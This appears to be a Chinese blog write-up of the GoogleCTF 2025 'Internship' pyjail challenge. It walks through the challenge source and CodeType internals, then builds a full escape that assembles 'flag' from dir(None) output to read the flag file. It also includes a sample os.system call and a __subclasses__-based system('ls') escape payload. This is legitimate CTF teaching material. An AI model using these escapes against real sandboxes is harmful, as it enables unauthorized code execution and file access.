---
title: GoogleCTF 2025 Internship Writeup
date: 2025-06-30
last_modified_at: 2025-06-30 9:30:00 +0800
categories: [CTF,Python]
tags: [pyjail]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/Google-CTF-2025.png
toc: true

---

来自 Google CTF 的一道 pyjail，主要涉及构造代码对象时的各种注意事项和规范。

## 题目简介
题目信息如下：
> We just hired an intern, and they kept telling me their Python shell returns 1 when they asked for 2, and 6 when they asked for 9, and 4 when they asked for 20. What's going on?
> 
> Author: mxms

附件下载链接：[Google CTF pwn Internship](/assets/archives/dce71cf07be3e363fa23ea147082441be615afde5b8bdb1f89b6e3349d0f9493f3df269835975677b64e435591ad7f918d196d0c3a4d3c4f1e654c04c6ed6358.zip)

源码如下：
```py
import ctypes
import random
import sys
import os
import struct

from types import CodeType, FunctionType

p32 = lambda x: struct.pack("<i", x)
u32 = lambda x: struct.unpack("<i", x)[0]

class Intern:
    def __init__(self, g, i, b):
        self.g = g
        self.i = i
        self.b = b

    def serialize(self):
        return self.g + p32(self.i) + self.b

def swap():
    ints = [x for x in range(255)]
    random.shuffle(ints)

    intern_num_size = 28 + 4
    interns = ctypes.string_at(id(1), 255 * intern_num_size)
    structure = lambda x: Intern(x[0:24], u32(x[24:28]), x[28:32])

    new_interns = bytearray()

    for i in range(255):
        st = structure(interns[i* intern_num_size : (i + 1) * intern_num_size])
        st.i = ints[i]
        
        new_interns += st.serialize()

    #  3 2 1 let's jam
    ctypes.memmove(id(1), bytes(new_interns), len(new_interns))

def main():
    print("We just hired an intern and they keep telling me that their python interpreter isn't working. They keep trying to read the `flag` but it keeps crashing. I don't really have time to debug this with them. Can you help them out?")

    the_code = ''
    while True:
        line = input()
        if line == '':
            break
        the_code = the_code + line + '\n'

    g = compile(the_code, '<string>', 'exec')

    to_exec = CodeType(
        0,
        0,
        0,
        1,
        10,
        0,
        g.co_code,
        (None,),
        ('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'),
        ('a',),
        '<string>',
        '<module>',
        '',
        1,
        b'',
        b'',
        (),
        (),
    )

    sc = FunctionType (to_exec, {})
    swap()
    sc()

if __name__ == '__main__':
    main()
```
代码整体上可以分为以下几个部分：
1. the_code 是我们输入的代码，经过 compile 得到代码对象。
2. 构建一个新的 CodeType (代码对象)，其中 co_code（字节码）替换为我们此前输入并编译得到的字节码。其他参数均进行限制。
3. 将 CodeType 放入 FunctionType 生产一个函数 sc。
4. 使用 swap 函数读取 Python 内存，将解释器内部缓存的小整数 0-254 随机打乱。
5. 执行 sc 函数

## 代码对象
由于题目涉及到了代码对象 CodeType ，我们必须先了解 Python 代码对象的基本结构。

在 Python 中，当我们使用 `compile()` 函数编译代码时，会生成一个代码对象，它包含了字节码、常量、变量名等信息。而题目中的关键点在于，它创建了一个新的 CodeType 对象，但只保留了原始代码的字节码（co_code），其他参数都被重新设置，这实际上是对代码执行环境的一种限制。

构造 CodeType 时传入的参数都有哪些含义呢？
```py
CodeType(
    0,           # 1. argcount
    0,           # 2. posonlyargcount  
    0,           # 3. kwonlyargcount
    1,           # 4. nlocals
    10,          # 5. stacksize
    0,           # 6. flags
    g.co_code,   # 7. code
    (None,),     # 8. consts
    ('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'),  # 9. names
    ('a',),      # 10. varnames
    '<string>',  # 11. filename
    '<module>',  # 12. name
    '',          # 13. qualname
    1,           # 14. firstlineno
    b'',         # 15. lnotab/linetable
    b'',         # 16. exceptiontable
    (),          # 17. freevars
    (),          # 18. cellvars
)
```
1. `codeobject.co_argcount` : 函数具有的位置参数总数（包括仅位置参数和具有默认值的参数）
2. `codeobject.co_posonlyargcount` : 函数具有的仅位置参数数量（包括具有默认值的参数）
3. `codeobject.co_kwonlyargcount` : 函数具有的仅关键字参数数量（包括具有默认值的参数）
4. `codeobject.co_nlocals` : 函数使用的局部变量数量（包括参数）
5. `codeobject.co_stacksize` : 代码对象所需的栈大小
6. `codeobject.co_flags` : 为解释器编码多个标志的整数
7. `codeobject.co_code` : 表示函数中字节码指令序列的字符串
8. `codeobject.co_consts` : 包含字节码在函数中使用的字面量的元组
9. `codeobject.co_names` : 包含字节码在函数中使用的名称的元组
10. `codeobject.co_varnames` : 包含函数中局部变量名称的元组（从参数名称开始）
11. `codeobject.co_filename` : 编译代码的文件名称
12. `codeobject.co_name` : 函数名称
13. `codeobject.co_qualname` : 函数的完全限定名称 *(在版本 3.11 中添加)*
14. `codeobject.co_firstlineno` : 函数第一行的行号
15. `codeobject.co_lnotab` : 编码字节码偏移量到行号映射的字符串。详细信息请参阅解释器的源代码。*(自版本 3.12 起已弃用：代码对象的此属性已弃用，可能在 Python 3.15 中移除)*
16. `codeobject.co_exceptiontable`: 异常处理表，用于描述函数中的异常处理。
17. `codeobject.co_freevars` : 包含函数中自由变量名称的元组
18. `codeobject.co_cellvars` : 包含函数内部嵌套函数引用的局部变量名称的元组


更详细的信息可见官方文档：
- [types — Dynamic type creation and names for built-in types — Python 3.12.10 documentation](https://docs.python.org/3.12/library/types.html#types.CodeType)
- [3. Data model — Python 3.12.10 documentation](https://docs.python.org/3.12/reference/datamodel.html#code-objects)

我们可以编写一个简单的示例来输出这些信息：
```python
def read():
    return __import__('os').system('calc')

def dump_codeobject(obj):
    print(obj.co_argcount)
    print(obj.co_posonlyargcount)
    print(obj.co_kwonlyargcount)
    print(obj.co_nlocals)
    print(obj.co_stacksize)
    print(obj.co_flags)
    print(obj.co_code)
    print(obj.co_consts)
    print(obj.co_names)
    print(obj.co_varnames)
    print(obj.co_filename)
    print(obj.co_name)
    print(obj.co_qualname)
    print(obj.co_firstlineno)
    print(obj.co_linetable)
    print(obj.co_exceptiontable)
    print(obj.co_freevars)
    print(obj.co_cellvars)

dump_codeobject(read.__code__)
```
结果如下：
```bash
0
0
0
0
3
3
b'\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xab\x01\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xab\x01\x00\x00\x00\x00\x00\x00S\x00'
(None, 'os', 'calc')
('__import__', 'system')
()
D:\work\tmp\pwn-internship\test.py
read
read
1
b'\x80\x00\xdc\x0b\x15\x90d\xd3\x0b\x1b\xd7\x0b"\xd1\x0b"\xa06\xd3\x0b*\xd0\x04*'
b''
()
()
```


## 分析
为了方便分析可以自行编写测试脚本：
```py
from types import CodeType, FunctionType

def dump_codeobject(obj):
    print(obj.co_argcount)
    print(obj.co_posonlyargcount)
    print(obj.co_kwonlyargcount)
    print(obj.co_nlocals)
    print(obj.co_stacksize)
    print(obj.co_flags)
    print(obj.co_code)
    print(obj.co_consts)
    print(obj.co_names)
    print(obj.co_varnames)
    print(obj.co_filename)
    print(obj.co_name)
    print(obj.co_qualname)
    print(obj.co_firstlineno)
    print(obj.co_linetable)
    print(obj.co_exceptiontable)
    print(obj.co_freevars)
    print(obj.co_cellvars)

the_code = """
os.system()
"""

g = compile(the_code, '<string>', 'exec')

dump_codeobject(g)

to_exec = CodeType(
    0,
    0,
    0,
    1,
    10,
    0,
    g.co_code,
    (None,),
    ('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'),
    ('a',),
    '<string>',
    '<module>',
    '',
    1,
    b'',
    b'',
    (),
    (),
)

sc = FunctionType (to_exec, {})
sc()
```

**那么题目主要的限制在哪些地方？**
1. names 对应代码中引用的全局变量名和内置函数名。`('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read')` 意味着代码中只能出现这些符号。
   比如不能出现一个 os.system 这样的命令，否则 names 中就会出现
    ```
    ('os', 'system')
    ```
   这些符号必须要使用，否则也会造成执行出错。比如,如果我们代码中没有声明 p 这个变量，就会出现：
   ```bash
    File "D:\work\tmp\pwn-internship\exp.py", line 53, in <module>
      sc()
    File "<string>", line -1, in <module>
    NameError: name 'p' is not defined
   ```
   并且需要注意的是，names 元组中的符号顺序必须与代码中实际使用的顺序一致（符号出现的顺序也不能改变），否则也会出现意想不到的报错。
2. consts 为常量。题目限制常量只能用 None。数字、字符串都是不能直接使用。
   也同时限制了函数或者或者 lambda 表达式的使用。比如下面的代码，会在 consts 中放入一个 `code object`
    ```py
    the_code = """
    def x():
        [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
    x()
    """
    # (<code object x at 0x000002997100C6B0, file "<string>", line 2>, None)
    ```
3. swap() 会打乱内存布局，使得数字索引无法正常工作。经过测试，如果在代码中间调用 print 会导致其后的代码无法执行。所以 print 必须最后才能使用，（这是逐步尝试发现的规律）
4. exceptiontable 为空，表示不能使用异常，即使代码中有异常处理的逻辑，也无法处理。


经过测试，其他的参数对最终调用影响不大。

## 构造 EXP
题目限制了只能使用这些符号,并且 flag 存放在当前目录的 flag 文件中。那么可以考虑构造出字符串 "flag"，然后调用 open 读取。
```bash
('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'),
```

题目唯一可用的常量是 None。dir 函数可以获取到对象的属性列表。
```py
>>> dir(None)
['__bool__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
```
结合 `__iter__` 和 `__next__` 就可以获取到任意字符了。
```py
p = None
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
```

构造出 flag，我们使用 read 来作为中间变量存储字符串。
```py
p = None
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = open(read).read()
print(p)
```
但是这会遇到前面提到的问题，符号出现的顺序问题，上面的代码中 read、open、print 的出现顺序倒转了过来，会导致代码运行报错。

稍加修改即可：
```py
p = None
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = print
f = open
read = f"{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = dir(None)
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
f = p.__iter__()
p = f.__next__()
p = f.__next__()
p = f.__next__()
read = f"{read}{p}"
p = open(read).read()
print(p)
```